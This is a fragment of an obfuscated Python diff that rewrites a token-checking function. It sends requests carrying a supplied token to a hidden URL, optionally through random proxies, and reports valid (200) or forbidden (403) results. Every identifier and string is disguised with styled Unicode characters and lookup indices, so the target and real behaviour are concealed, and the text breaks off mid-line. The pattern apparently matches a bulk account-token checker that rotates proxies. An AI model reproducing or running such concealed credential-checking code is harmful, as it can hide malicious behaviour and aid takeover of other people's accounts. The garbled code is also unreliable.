𝗡𝗠𝘔𝗠𝙉𝙡𝘭𝙈𝙈𝘭𝙈𝙈𝙉𝙡𝗜𝙈𝘐𝗜𝘕𝙈𝗜𝙄𝘔𝙄𝘭𝗜𝗡𝗜𝗠𝗜𝙄𝙈[247], 𝗡𝘔𝗠𝘔𝘕𝗹𝘭𝘔𝙈𝘭𝗠𝘔𝙉𝗹𝗜𝘔𝘐𝙄𝘕𝘔𝗜𝘐𝙈𝙄𝗹𝘐𝙉𝙄𝙈𝗜𝗜𝘔[141]: 𝘕𝙈𝘔𝙈𝗡𝙡𝗹𝘔𝙈𝘭𝘔𝙈𝙉𝗹𝙄𝘔𝙄𝙄𝙉𝗠𝙄𝗜𝘔𝗜𝗹𝙄𝗡𝗜𝘔𝘐𝘐𝘔[237], 𝙉𝘔𝗠𝗠𝘕𝗹𝘭𝙈𝙈𝘭𝙈𝙈𝘕𝗹𝗜𝘔𝘐𝘐𝗡𝙈𝗜𝙄𝗠𝙄𝗹𝙄𝘕𝗜𝙈𝗜𝙄𝙈[236]: 𝘕𝙈𝙈𝙈𝘕𝘭𝙡𝘔𝗠𝘭𝘔𝗠𝗡𝙡𝗜𝗠𝙄𝙄𝘕𝗠𝗜𝘐𝗠𝘐𝗹𝘐𝗡𝙄𝙈𝙄𝙄𝗠[248], 𝘕𝘔𝗠𝘔𝗡𝘭𝘭𝙈𝙈𝗹𝘔𝘔𝗡𝙡𝙄𝘔𝗜𝗜𝙉𝘔𝘐𝙄𝗠𝗜𝙡𝗜𝗡𝘐𝙈𝘐𝙄𝙈[142]: 𝗡𝗠𝘔𝙈𝙉𝙡𝗹𝘔𝙈𝗹𝘔𝗠𝘕𝘭𝗜𝙈𝙄𝗜𝙉𝙈𝙄𝙄𝗠𝘐𝘭𝗜𝗡𝗜𝗠𝗜𝗜𝙈[249]}
+    return {𝙄𝙉𝗜𝗡𝘭𝗹𝙄𝙈𝗜𝙄𝘭𝘔𝗹𝙡𝗜𝘭𝗹𝘕𝙉𝙄𝗹𝘭𝙈𝘕𝙡𝘕𝙡𝙈𝗜𝙈𝙄𝙈[219]: 𝙩𝙤𝗸𝘦𝘯, 𝗜𝘕𝙄𝙉𝗹𝙡𝘐𝘔𝗜𝗜𝘭𝗠𝙡𝘭𝙄𝗹𝘭𝙉𝙉𝗜𝙡𝘭𝙈𝗡𝘭𝘕𝙡𝘔𝗜𝘔𝘐𝘔[127]: 𝗜𝗡𝘐𝘕𝘭𝙡𝘐𝘔𝙄𝘐𝘭𝙈𝙡𝗹𝙄𝘭𝘭𝙉𝙉𝘐𝘭𝗹𝗠𝗡𝙡𝘕𝘭𝘔𝗜𝙈𝗜𝗠[136], 𝙄𝙉𝘐𝘕𝙡𝘭𝘐𝘔𝘐𝗜𝗹𝙈𝘭𝗹𝗜𝙡𝗹𝙉𝘕𝗜𝘭𝘭𝘔𝙉𝘭𝙉𝙡𝗠𝘐𝗠𝗜𝙈[128]: 𝗜𝙉𝗜𝙉𝗹𝙡𝗜𝙈𝘐𝘐𝘭𝗠𝙡𝘭𝗜𝗹𝘭𝙉𝙉𝘐𝘭𝙡𝘔𝙉𝗹𝗡𝘭𝗠𝙄𝗠𝘐𝙈[137], 𝙄𝗡𝙄𝙉𝙡𝘭𝘐𝙈𝙄𝘐𝙡𝘔𝙡𝘭𝙄𝗹𝗹𝙉𝙉𝙄𝘭𝗹𝘔𝘕𝘭𝗡𝗹𝘔𝗜𝙈𝙄𝗠[129]: 𝗜𝗡𝙄𝗡𝘭𝗹𝗜𝙈𝘐𝘐𝗹𝘔𝘭𝗹𝙄𝙡𝙡𝘕𝘕𝙄𝘭𝗹𝘔𝗡𝘭𝗡𝘭𝘔𝗜𝙈𝘐𝘔[230], 𝗜𝘕𝘐𝙉𝘭𝙡𝘐𝘔𝙄𝙄𝘭𝙈𝙡𝗹𝘐𝙡𝙡𝙉𝗡𝘐𝘭𝘭𝙈𝘕𝗹𝙉𝙡𝗠𝗜𝗠𝗜𝗠[220]: 𝙄𝘕𝙄𝗡𝘭𝘭𝙄𝙈𝙄𝗜𝗹𝗠𝗹𝙡𝘐𝘭𝙡𝘕𝙉𝘐𝙡𝗹𝙈𝙉𝘭𝙉𝙡𝙈𝙄𝙈𝙄𝘔[231], 𝙄𝙉𝙄𝘕𝘭𝘭𝙄𝙈𝘐𝘐𝙡𝘔𝗹𝘭𝘐𝗹𝙡𝘕𝙉𝙄𝗹𝗹𝗠𝗡𝗹𝘕𝘭𝘔𝗜𝙈𝙄𝘔[131]: 𝘐𝗡𝗜𝘕𝘭𝘭𝘐𝙈𝗜𝙄𝙡𝘔𝙡𝘭𝙄𝗹𝘭𝙉𝘕𝗜𝗹𝗹𝙈𝗡𝘭𝙉𝗹𝙈𝙄𝙈𝘐𝗠[232], 𝘐𝙉𝘐𝙉𝗹𝘭𝗜𝘔𝙄𝗜𝙡𝘔𝗹𝗹𝘐𝙡𝙡𝙉𝘕𝙄𝙡𝙡𝗠𝘕𝗹𝘕𝙡𝙈𝙄𝗠𝗜𝙈[221]: 𝘐𝗡𝙄𝘕𝙡𝗹𝘐𝙈𝗜𝙄𝘭𝘔𝙡𝙡𝗜𝙡𝗹𝘕𝗡𝗜𝘭𝙡𝙈𝘕𝙡𝘕𝗹𝘔𝘐𝘔𝙄𝙈[100], 𝘐𝙉𝘐𝙉𝘭𝗹𝘐𝗠𝗜𝗜𝗹𝘔𝙡𝙡𝗜𝗹𝘭𝙉𝗡𝙄𝗹𝘭𝗠𝘕𝗹𝗡𝗹𝙈𝙄𝘔𝘐𝘔[222]: 𝗜𝙉𝗜𝘕𝙡𝙡𝗜𝙈𝙄𝗜𝘭𝘔𝙡𝙡𝘐𝙡𝘭𝙉𝘕𝗜𝗹𝙡𝙈𝗡𝗹𝗡𝘭𝘔𝙄𝗠𝗜𝗠[233], 𝙄𝘕𝘐𝙉𝗹𝘭𝙄𝘔𝗜𝘐𝙡𝘔𝘭𝙡𝗜𝗹𝘭𝘕𝘕𝘐𝗹𝗹𝙈𝗡𝘭𝗡𝗹𝙈𝙄𝘔𝙄𝙈[223]: 𝙄𝗡𝙄𝙉𝙡𝘭𝘐𝗠𝙄𝗜𝘭𝗠𝙡𝘭𝙄𝘭𝘭𝙉𝘕𝗜𝘭𝘭𝙈𝗡𝘭𝙉𝘭𝘔𝙄𝘔𝘐𝘔[234], 𝘐𝙉𝗜𝙉𝗹𝗹𝙄𝗠𝘐𝙄𝙡𝙈𝙡𝗹𝙄𝙡𝙡𝘕𝗡𝗜𝗹𝘭𝘔𝙉𝗹𝘕𝘭𝗠𝘐𝗠𝗜𝙈[224]: 𝙄𝗡𝗜𝘕𝗹𝘭𝘐𝘔𝘐𝙄𝙡𝙈𝙡𝗹𝗜𝘭𝙡𝙉𝙉𝙄𝘭𝘭𝘔𝘕𝙡𝘕𝙡𝙈𝘐𝗠𝙄𝘔[235], 𝙄𝗡𝗜𝙉𝗹𝘭𝙄𝙈𝗜𝙄𝘭𝗠𝙡𝘭𝙄𝘭𝗹𝘕𝗡𝗜𝘭𝙡𝗠𝙉𝙡𝗡𝙡𝘔𝙄𝙈𝘐𝗠[225]: 𝙄𝗡𝗜𝙉𝘭𝙡𝗜𝘔𝘐𝗜𝙡𝙈𝙡𝗹𝘐𝙡𝙡𝗡𝘕𝙄𝗹𝙡𝙈𝙉𝘭𝙉𝘭𝘔𝘐𝗠𝗜𝘔[236], 𝘐𝘕𝘐𝘕𝘭𝗹𝗜𝙈𝘐𝗜𝙡𝙈𝘭𝙡𝙄𝘭𝗹𝙉𝙉𝘐𝘭𝙡𝗠𝗡𝙡𝘕𝗹𝘔𝘐𝘔𝙄𝘔[226]: 𝘐𝙉𝗜𝙉𝙡𝙡𝗜𝘔𝙄𝘐𝗹𝘔𝗹𝗹𝗜𝘭𝗹𝘕𝙉𝗜𝘭𝙡𝙈𝘕𝗹𝗡𝘭𝙈𝗜𝘔𝘐𝙈[237], 𝗜𝗡𝘐𝗡𝗹𝗹𝘐𝘔𝘐𝙄𝘭𝗠𝙡𝗹𝙄𝘭𝘭𝗡𝙉𝘐𝘭𝙡𝗠𝙉𝘭𝘕𝘭𝘔𝘐𝗠𝘐𝗠[227]: 𝘐𝗡𝙄𝙉𝘭𝗹𝘐𝘔𝘐𝗜𝗹𝘔𝘭𝗹𝗜𝗹𝗹𝗡𝙉𝘐𝗹𝗹𝙈𝙉𝗹𝗡𝘭𝗠𝘐𝙈𝙄𝗠[238], 𝗜𝘕𝙄𝙉𝙡𝙡𝙄𝙈𝘐𝙄𝙡𝘔𝙡𝘭𝗜𝘭𝘭𝗡𝘕𝗜𝗹𝙡𝙈𝘕𝘭𝘕𝗹𝘔𝘐𝙈𝘐𝘔[133]: 𝘐𝙉𝙄𝗡𝘭𝘭𝘐𝙈𝙄𝘐𝙡𝙈𝗹𝗹𝙄𝙡𝗹𝘕𝗡𝙄𝗹𝘭𝗠𝘕𝘭𝗡𝙡𝘔𝗜𝙈𝗜𝙈[239], 𝘐𝙉𝙄𝙉𝘭𝘭𝙄𝙈𝗜𝙄𝗹𝙈𝗹𝙡𝗜𝗹𝙡𝗡𝙉𝘐𝘭𝙡𝘔𝗡𝘭𝗡𝙡𝘔𝘐𝘔𝙄𝗠[228]: 𝘐𝙉𝗜𝙉𝙡𝗹𝗜𝗠𝙄𝙄𝗹𝗠𝘭𝘭𝘐𝙡𝙡𝙉𝙉𝗜𝘭𝙡𝙈𝙉𝙡𝙉𝗹𝗠𝗜𝗠𝙄𝗠[240], 𝘐𝙉𝘐𝙉𝙡𝗹𝙄𝗠𝙄𝘐𝙡𝗠𝙡𝗹𝗜𝙡𝘭𝗡𝘕𝘐𝙡𝙡𝙈𝘕𝘭𝗡𝘭𝘔𝘐𝗠𝙄𝘔[134]: 𝙄𝙉𝙄𝘕𝘭𝙡𝙄𝘔𝙄𝗜𝙡𝘔𝙡𝘭𝘐𝘭𝙡𝗡𝗡𝘐𝙡𝙡𝘔𝘕𝗹𝗡𝗹𝙈𝗜𝗠𝙄𝗠[230], 𝘐𝗡𝙄𝗡𝙡𝘭𝘐𝙈𝘐𝗜𝙡𝘔𝙡𝗹𝗜𝘭𝗹𝘕𝗡𝗜𝘭𝘭𝘔𝘕𝙡𝘕𝙡𝗠𝗜𝙈𝘐𝗠[229]: 𝗜𝗡𝗜𝗡𝘭𝗹𝘐𝘔𝘐𝘐𝘭𝙈𝙡𝙡𝘐𝗹𝗹𝙉𝗡𝙄𝗹𝗹𝗠𝗡𝙡𝙉𝗹𝗠𝘐𝘔𝗜𝗠[241], 𝘐𝘕𝗜𝘕𝗹𝙡𝗜𝘔𝙄𝙄𝙡𝙈𝘭𝙡𝘐𝗹𝗹𝗡𝘕𝘐𝗹𝗹𝙈𝗡𝗹𝗡𝙡𝘔𝗜𝘔𝗜𝗠[135]: 𝗜𝗡𝙄𝗡𝗹𝙡𝗜𝘔𝙄𝙄𝙡𝙈𝙡𝘭𝘐𝘭𝙡𝗡𝘕𝘐𝙡𝘭𝙈𝙉𝘭𝘕𝘭𝘔𝙄𝘔𝘐𝙈[242]}
 
 def check_token(token):
-    𝙝𝙚𝘢𝗱𝗲𝗿𝘴 = 𝘏𝗲𝗮𝗱𝙚𝗿𝘀(𝙩𝗼𝙠𝙚𝘯)
+    𝗵𝗲𝘢𝗱𝗲𝘳𝘀 = 𝗛𝗲𝙖𝗱𝙚𝙧𝙨(𝘵𝗼𝙠𝗲𝙣)
     try:
-        if 𝘱𝙧𝗼𝙭𝘆:
-            𝙧𝘦𝘀𝗽𝗼𝙣𝘴𝙚 = 𝗿𝗲𝙦𝙪𝘦𝙨𝘵𝘀.get(𝗡𝙈𝙈𝙈𝗡𝙡𝙡𝗠𝗠𝙡𝘔𝗠𝙉𝗹𝙄𝘔𝘐𝘐𝗡𝘔𝘐𝗜𝙈𝗜𝗹𝙄𝙉𝙄𝘔𝘐𝙄𝗠[250], headers=𝘩𝗲𝗮𝘥𝗲𝗿𝘀, proxy={𝘕𝙈𝙈𝗠𝗡𝙡𝙡𝙈𝘔𝗹𝘔𝘔𝙉𝙡𝙄𝘔𝙄𝙄𝗡𝙈𝘐𝙄𝙈𝗜𝙡𝙄𝗡𝗜𝗠𝙄𝙄𝗠[251]: 𝗡𝘔𝗠𝗠𝘕𝗹𝗹𝘔𝙈𝘭𝙈𝗠𝙉𝘭𝘐𝘔𝘐𝘐𝙉𝘔𝘐𝗜𝙈𝙄𝙡𝙄𝗡𝙄𝗠𝗜𝘐𝗠[253] + 𝘳𝙖𝘯𝘥𝘰𝘮.choice(𝙥𝙧𝘰𝘹𝘪𝙚𝘀), 𝘕𝙈𝗠𝙈𝗡𝗹𝙡𝘔𝙈𝗹𝘔𝘔𝗡𝗹𝙄𝗠𝘐𝙄𝗡𝙈𝘐𝙄𝘔𝙄𝘭𝙄𝗡𝗜𝗠𝙄𝗜𝘔[252]: 𝙉𝘔𝙈𝗠𝘕𝗹𝗹𝙈𝗠𝘭𝗠𝗠𝗡𝗹𝙄𝘔𝘐𝘐𝙉𝙈𝙄𝗜𝘔𝘐𝗹𝗜𝗡𝗜𝗠𝘐𝗜𝙈[253] + 𝘳𝘢𝘯𝘥𝗼𝙢.choice(𝘱𝙧𝘰𝘅𝙞𝘦𝙨)})
+        if 𝘱𝙧𝙤𝘹𝙮:
+            𝙧𝘦𝘴𝙥𝗼𝘯𝘀𝘦 = 𝘳𝘦𝙦𝙪𝙚𝙨𝘁𝙨.get(𝙄𝗡𝙄𝙉𝗹𝙡𝘐𝙈𝙄𝙄𝗹𝗠𝙡𝘭𝙄𝙡𝗹𝗡𝗡𝙄𝘭𝘭𝗠𝗡𝗹𝙉𝘭𝗠𝘐𝙈𝗜𝗠[243], headers=𝗵𝗲𝗮𝘥𝙚𝘳𝙨, proxy={𝘐𝘕𝗜𝘕𝘭𝙡𝘐𝗠𝙄𝘐𝗹𝗠𝗹𝙡𝗜𝙡𝙡𝗡𝙉𝗜𝙡𝘭𝙈𝗡𝙡𝗡𝗹𝙈𝘐𝘔𝙄𝙈[244]: 𝙄𝗡𝗜𝘕𝘭𝘭𝙄𝘔𝗜𝙄𝗹𝗠𝙡𝘭𝗜𝗹𝗹𝗡𝙉𝙄𝙡𝙡𝙈𝙉𝙡𝗡𝘭𝙈𝗜𝗠𝗜𝗠[246] + 𝙧𝗮𝙣𝘥𝘰𝙢.choice(𝗽𝙧𝘰𝘹𝙞𝘦𝘴), 𝙄𝗡𝗜𝘕𝗹𝗹𝗜𝙈𝗜𝗜𝘭𝗠𝘭𝘭𝙄𝘭𝘭𝗡𝗡𝙄𝘭𝘭𝗠𝙉𝘭𝘕𝙡𝙈𝘐𝗠𝗜𝙈[245]: 𝘐𝗡𝙄𝙉𝗹𝙡𝗜𝘔𝗜𝙄𝙡𝙈𝙡𝘭𝙄𝗹𝙡𝗡𝗡𝗜𝘭𝗹𝗠𝗡𝘭𝗡𝙡𝙈𝗜𝙈𝘐𝗠[246] + 𝙧𝙖𝘯𝙙𝙤𝙢.choice(𝙥𝗿𝙤𝘅𝙞𝗲𝘴)})
         else:
-            𝙧𝗲𝘴𝘱𝘰𝗻𝘴𝙚 = 𝗿𝘦𝗾𝘶𝙚𝘴𝘵𝙨.get(𝘕𝗠𝙈𝙈𝘕𝘭𝙡𝘔𝗠𝘭𝘔𝙈𝗡𝘭𝙄𝘔𝘐𝘐𝘕𝙈𝙄𝗜𝙈𝘐𝘭𝗜𝗡𝙄𝘔𝗜𝗜𝙈[250], headers=𝗵𝘦𝘢𝙙𝙚𝘳𝘴)
-        𝘥𝗻 = 𝘵𝗼𝘬𝘦𝙣.split(𝗡𝗠𝗠𝘔𝙉𝗹𝙡𝙈𝙈𝙡𝘔𝘔𝙉𝗹𝘐𝘔𝗜𝘐𝘕𝙈𝘐𝘐𝘔𝗜𝘭𝗜𝙉𝗜𝘔𝘐𝘐𝙈[254])
-        𝗻𝘯 = 𝘥𝗻[0]
-        if 𝘳𝗲𝘴𝘱𝗼𝙣𝙨𝗲.status_code == 200:
-            𝗽𝗿𝘪𝗻𝙩(f"{𝘳}{𝙉𝗠𝙈𝘔𝙉𝗹𝗹𝗠𝗠𝘭𝗠𝙈𝙉𝗹𝙄𝗠𝗜𝘐𝗡𝗠𝙄𝗜𝘔𝘐𝘭𝗜𝗡𝗜𝙈𝘐𝙄𝘔[98]}{𝗱𝙖𝘁𝘦𝘁𝙞𝗺𝘦.datetime.now().strftime(f'{𝙜}{𝙉𝗠𝘔𝗠𝙉𝙡𝙡𝗠𝘔𝙡𝙈𝙈𝗡𝗹𝘐𝘔𝙄𝙄𝘕𝘔𝙄𝙄𝘔𝘐𝘭𝗜𝙉𝙄𝘔𝘐𝘐𝗠[99]}{𝘳}')}{𝙉𝙈𝗠𝘔𝙉𝗹𝗹𝘔𝙈𝘭𝘔𝙈𝙉𝗹𝗜𝘔𝘐𝗜𝘕𝙈𝗜𝘐𝗠𝘐𝘭𝙄𝗡𝙄𝘔𝗜𝙄𝙈[100]}{𝗿}{𝘕𝙈𝗠𝙈𝗡𝘭𝘭𝗠𝗠𝘭𝗠𝗠𝙉𝘭𝗜𝘔𝗜𝗜𝘕𝙈𝗜𝗜𝘔𝘐𝘭𝘐𝘕𝙄𝘔𝗜𝘐𝙈[98]}{𝘭𝗰}{𝗡𝘔𝘔𝗠𝘕𝗹𝙡𝘔𝗠𝗹𝗠𝙈𝙉𝙡𝘐𝘔𝙄𝗜𝗡𝘔𝘐𝙄𝗠𝘐𝙡𝙄𝙉𝘐𝗠𝙄𝘐𝙈[255]}{𝙧}{𝗡𝗠𝗠𝙈𝙉𝘭𝗹𝙈𝘔𝘭𝙈𝗠𝙉𝗹𝗜𝘔𝗜𝙄𝘕𝙈𝘐𝗜𝙈𝙄𝗹𝗜𝘕𝙄𝙈𝗜𝙄𝗠[100]}{𝘯𝘯}{𝘨}{𝙉𝗠𝗠𝘔𝗡𝙡𝙡𝗠𝗠𝗹𝗠𝘔𝗡𝗹𝘐𝙈𝗜𝘐𝙉𝙈𝗜𝘐𝙈𝘐𝙡𝙄𝗡𝗜𝘔𝙄𝘐𝘔[256]}")
+            𝗿𝗲𝘴𝘱𝘰𝙣𝙨𝙚 = 𝘳𝗲𝘲𝙪𝙚𝘀𝙩𝘴.get(𝗜𝗡𝘐𝙉𝗹𝙡𝘐𝘔𝗜𝙄𝗹𝗠𝗹𝗹𝘐𝘭𝙡𝗡𝙉𝘐𝙡𝗹𝘔𝙉𝙡𝗡𝙡𝗠𝘐𝘔𝘐𝙈[243], headers=𝙝𝙚𝗮𝘥𝗲𝙧𝘴)
+        𝗱𝙣 = 𝙩𝗼𝗸𝙚𝘯.split(𝙄𝗡𝙄𝙉𝗹𝗹𝗜𝘔𝙄𝙄𝙡𝗠𝘭𝘭𝙄𝘭𝗹𝘕𝘕𝘐𝙡𝙡𝙈𝙉𝘭𝘕𝙡𝗠𝙄𝙈𝗜𝙈[247])
+        𝙣𝙣 = 𝙙𝙣[0]
+        if 𝗿𝙚𝙨𝘱𝙤𝘯𝘴𝙚.status_code == 200:
+            𝘱𝘳𝘪𝗻𝙩(f"{𝗿}{𝗜𝘕𝙄𝙉𝗹𝙡𝗜𝗠𝙄𝗜𝘭𝗠𝗹𝙡𝘐𝙡𝙡𝙉𝙉𝘐𝗹𝘭𝙈𝘕𝙡𝗡𝗹𝙈𝗜𝙈𝙄𝙈[91]}{𝙙𝙖𝙩𝘦𝙩𝙞𝘮𝘦.datetime.now().strftime(f'{𝙜}{𝗜𝘕𝗜𝘕𝙡𝘭𝘐𝘔𝙄𝙄𝙡𝙈𝙡𝗹𝙄𝗹𝗹𝙉𝘕𝘐𝗹𝗹𝙈𝗡𝙡𝗡𝘭𝘔𝙄𝘔𝘐𝘔[92]}{𝙧}')}{𝗜𝗡𝗜𝗡𝗹𝘭𝙄𝘔𝗜𝗜𝙡𝘔𝘭𝗹𝗜𝘭𝘭𝗡𝘕𝘐𝙡𝗹𝗠𝗡𝗹𝘕𝗹𝙈𝘐𝗠𝘐𝗠[93]}{𝙧}{𝘐𝘕𝘐𝗡𝙡𝘭𝘐𝘔𝙄𝙄𝗹𝘔𝙡𝘭𝙄𝗹𝘭𝘕𝙉𝗜𝙡𝘭𝗠𝙉𝘭𝗡𝙡𝘔𝙄𝙈𝘐𝘔[91]}{𝙡𝙘}{𝗜𝘕𝙄𝘕𝘭𝙡𝘐𝗠𝗜𝙄𝗹𝘔𝘭𝗹𝘐𝗹𝗹𝘕𝙉𝘐𝗹𝗹𝘔𝙉𝘭𝗡𝙡𝗠𝘐𝘔𝗜𝗠[248]}{𝙧}{𝙄𝙉𝘐𝙉𝙡𝙡𝘐𝗠𝘐𝙄𝘭𝙈𝘭𝙡𝗜𝙡𝙡𝘕𝘕𝙄𝗹𝘭𝙈𝙉𝙡𝙉𝙡𝗠𝗜𝙈𝘐𝘔[93]}{𝗻𝙣}{𝗴}{𝘐𝙉𝘐𝗡𝙡𝘭𝗜𝘔𝙄𝘐𝘭𝙈𝙡𝗹𝘐𝗹𝘭𝗡𝘕𝗜𝗹𝘭𝗠𝘕𝙡𝘕𝗹𝘔𝙄𝙈𝘐𝗠[249]}")
             return True
-        elif 𝘳𝗲𝘀𝘱𝘰𝗻𝙨𝙚.status_code == 403:
-            𝙥𝘳𝙞𝗻𝙩(f"{𝗿}{𝗡𝘔𝗠𝗠𝙉𝗹𝙡𝙈𝘔𝗹𝙈𝙈𝗡𝘭𝗜𝙈𝘐𝙄𝗡𝘔𝘐𝘐𝙈𝘐𝘭𝗜𝗡𝘐𝙈𝘐𝘐𝙈[98]}{𝙙𝙖𝙩𝗲𝘁𝙞𝗺𝙚.datetime.now().strftime(f'{𝗴}{𝗡𝙈𝙈𝘔𝘕𝘭𝙡𝘔𝘔𝘭𝙈𝗠𝘕𝙡𝗜𝗠𝘐𝙄𝗡𝘔𝗜𝙄𝘔𝗜𝙡𝘐𝘕𝘐𝘔𝘐𝙄𝗠[99]}{𝙧}')}{𝘕𝙈𝙈𝙈𝙉𝙡𝙡𝘔𝙈𝙡𝙈𝗠𝙉𝘭𝙄𝙈𝙄𝗜𝘕𝙈𝙄𝘐𝗠𝗜𝙡𝙄𝗡𝗜𝗠𝘐𝙄𝘔[100]}{𝗿}{𝘕𝙈𝘔𝗠𝗡𝘭𝗹𝘔𝙈𝗹𝗠𝘔𝗡𝗹𝙄𝘔𝘐𝗜𝗡𝙈𝗜𝗜𝗠𝘐𝘭𝗜𝗡𝙄𝘔𝘐𝘐𝗠[98]}{𝘍𝗼𝗿𝘦.CYAN}{𝙉𝙈𝙈𝗠𝗡𝗹𝗹𝗠𝗠𝙡𝙈𝘔𝘕𝘭𝙄𝘔𝘐𝘐𝗡𝙈𝘐𝘐𝗠𝗜𝘭𝗜𝗡𝘐𝙈𝗜𝙄𝗠[257]}{𝗿}{𝙉𝘔𝙈𝘔𝘕𝘭𝘭𝗠𝘔𝙡𝗠𝗠𝙉𝗹𝘐𝙈𝘐𝘐𝗡𝘔𝙄𝘐𝗠𝘐𝗹𝙄𝗡𝘐𝘔𝘐𝘐𝘔[100]}{𝗻𝘯}{𝙜}{𝙉𝗠𝙈𝘔𝗡𝗹𝙡𝗠𝘔𝗹𝗠𝗠𝗡𝗹𝙄𝘔𝙄𝗜𝙉𝙈𝘐𝘐𝗠𝘐𝘭𝙄𝗡𝙄𝗠𝗜𝗜𝙈[256]}")
+        elif 𝗿𝗲𝘴𝙥𝘰𝗻𝘀𝙚.status_code == 403:
+            𝙥𝘳𝙞𝙣𝙩(f"{𝗿}{𝗜𝘕𝗜𝙉𝘭𝙡𝗜𝗠𝘐𝙄𝘭𝗠𝙡𝗹𝗜𝗹𝙡𝗡𝙉𝘐𝗹𝙡𝙈𝙉𝙡𝘕𝘭𝘔𝙄𝗠𝙄𝙈[91]}{𝗱𝙖𝘵𝗲𝙩𝘪𝗺𝙚.datetime.now().strftime(f'{𝘨}{𝙄𝗡𝘐𝙉𝗹𝘭𝙄𝘔𝘐𝙄𝗹𝘔𝘭𝘭𝘐𝙡𝙡𝗡𝘕𝗜𝙡𝙡𝗠𝗡𝗹𝗡𝗹𝘔𝘐𝙈𝗜𝘔[92]}{𝙧}')}{𝗜𝙉𝗜𝙉𝘭𝙡𝗜𝙈𝗜𝘐𝙡𝙈𝘭𝙡𝙄𝗹𝘭𝘕𝘕𝘐𝘭𝗹𝘔𝗡𝗹𝙉𝘭𝗠𝗜𝘔𝙄𝗠[93]}{𝗿}{𝘐𝗡𝗜𝗡𝗹𝙡𝙄𝙈𝙄𝘐𝙡𝗠𝘭𝗹𝗜𝘭𝙡𝘕𝗡𝙄𝘭𝗹𝘔𝗡𝗹𝗡𝘭𝘔𝘐𝘔𝙄𝙈[91]}{𝘍𝘰𝙧𝘦.CYAN}{𝗜𝙉𝙄𝙉𝘭𝗹𝘐𝘔𝗜𝗜𝙡𝙈𝙡𝘭𝙄𝙡𝙡𝙉𝙉𝗜𝗹𝙡𝘔𝗡𝙡𝘕𝘭𝗠𝗜𝙈𝘐𝗠[250]}{𝗿}{𝘐𝗡𝗜𝘕𝘭𝙡𝙄𝗠𝙄𝘐𝘭𝙈𝘭𝗹𝘐𝗹𝗹𝙉𝘕𝙄𝗹𝘭𝗠𝗡𝘭𝘕𝗹𝗠𝘐𝘔𝙄𝙈[93]}{𝗻𝘯}{𝘨}{𝙄𝙉𝙄𝙉𝙡𝗹𝗜𝗠𝙄𝗜𝙡𝗠𝙡𝙡𝙄𝙡𝗹𝗡𝙉𝗜𝙡𝗹𝙈𝙉𝗹𝙉𝘭𝘔𝗜𝗠𝘐𝙈[249]}")
             return False
         else:
-            𝗽𝗿𝙞𝘯𝘵(f"{𝗿}{𝗡𝙈𝙈𝙈𝗡𝘭𝙡𝗠𝙈𝘭𝘔𝘔𝙉𝗹𝙄𝙈𝗜𝗜𝙉𝗠𝘐𝙄𝗠𝙄𝙡𝗜𝙉𝙄𝘔𝙄𝙄𝗠[98]}{𝗱𝗮𝘁𝘦𝙩𝗶𝗺𝗲.datetime.now().strftime(f'{𝘨}{𝘕𝗠𝗠𝗠𝘕𝙡𝘭𝘔𝙈𝘭𝙈𝗠𝘕𝙡𝘐𝘔𝘐𝗜𝙉𝙈𝙄𝗜𝗠𝙄𝘭𝘐𝘕𝙄𝘔𝙄𝗜𝘔[99]}{𝘳}')}{𝗡𝗠𝘔𝗠𝙉𝘭𝗹𝘔𝘔𝘭𝗠𝗠𝙉𝙡𝘐𝙈𝙄𝗜𝗡𝙈𝗜𝙄𝘔𝙄𝙡𝘐𝗡𝘐𝗠𝘐𝘐𝗠[100]}{𝗿}{𝙉𝙈𝙈𝙈𝘕𝘭𝘭𝗠𝘔𝘭𝗠𝗠𝙉𝙡𝘐𝗠𝘐𝙄𝘕𝗠𝙄𝘐𝗠𝙄𝙡𝗜𝙉𝘐𝗠𝗜𝗜𝙈[98]}{𝗯}{𝙉𝙈𝘔𝙈𝘕𝙡𝗹𝙈𝘔𝗹𝗠𝗠𝙉𝘭𝗜𝙈𝗜𝘐𝙉𝗠𝘐𝗜𝗠𝘐𝘭𝗜𝗡𝗜𝘔𝗜𝙄𝗠[258]}{𝘳}{𝗡𝘔𝘔𝗠𝙉𝘭𝗹𝘔𝙈𝗹𝗠𝘔𝘕𝙡𝘐𝘔𝙄𝘐𝗡𝘔𝙄𝘐𝘔𝘐𝘭𝙄𝘕𝙄𝘔𝗜𝘐𝙈[100]}{𝗻𝙣}{𝘨}{𝙉𝗠𝙈𝙈𝘕𝘭𝘭𝙈𝗠𝗹𝘔𝘔𝘕𝗹𝗜𝙈𝘐𝘐𝘕𝘔𝙄𝗜𝗠𝗜𝘭𝗜𝗡𝗜𝙈𝙄𝗜𝙈[256]}")
+            𝘱𝘳𝘪𝘯𝘵(f"{𝘳}{𝘐𝗡𝘐𝗡𝗹𝗹𝙄𝘔𝘐𝗜𝗹𝘔𝙡𝙡𝙄𝙡𝘭𝘕𝙉𝘐𝘭𝙡𝘔𝘕𝘭𝙉𝘭𝗠𝗜𝘔𝗜𝗠[91]}{𝙙𝘢𝘵𝗲𝘵𝗶𝙢𝗲.datetime.now().strftime(f'{𝗴}{𝘐𝙉𝗜𝙉𝘭𝙡𝗜𝙈𝙄𝗜𝗹𝘔𝘭𝘭𝗜𝙡𝗹𝗡𝘕𝙄𝘭𝘭𝗠𝗡𝘭𝗡𝙡𝙈𝙄𝗠𝘐𝗠[92]}{𝘳}')}{𝘐𝗡𝘐𝗡𝘭𝘭𝘐𝘔𝗜𝗜𝗹𝙈𝙡𝙡𝘐𝘭𝗹𝗡𝗡𝘐𝘭𝘭𝘔𝙉𝗹𝙉𝙡𝗠𝗜𝙈𝗜𝘔[93]}{𝙧}{𝘐𝙉𝙄𝗡𝘭𝗹𝗜𝘔𝘐𝙄𝘭𝗠𝙡𝘭𝘐𝘭𝗹𝗡𝙉𝘐𝘭𝘭𝙈𝙉𝘭𝙉𝘭𝙈𝙄𝙈𝗜𝘔[91]}{𝙗}{𝙄𝘕𝙄𝗡𝘭𝙡𝘐𝘔𝘐𝙄𝙡𝙈𝘭𝗹𝙄𝘭𝘭𝙉𝘕𝙄𝘭𝘭𝘔𝘕𝘭𝘕𝘭𝙈𝙄𝗠𝗜𝘔[251]}{𝘳}{𝗜𝗡𝘐𝗡𝙡𝙡𝘐𝙈𝘐𝗜𝗹𝙈𝙡𝘭𝙄𝘭𝘭𝘕𝗡𝗜𝙡𝗹𝘔𝗡𝙡𝘕𝙡𝘔𝙄𝙈𝘐𝘔[93]}{𝘯𝗻}{𝙜}{𝘐𝙉𝙄𝗡𝗹𝘭𝗜𝗠𝙄𝙄𝗹𝗠𝙡𝙡𝘐𝘭𝗹𝙉𝗡𝙄𝙡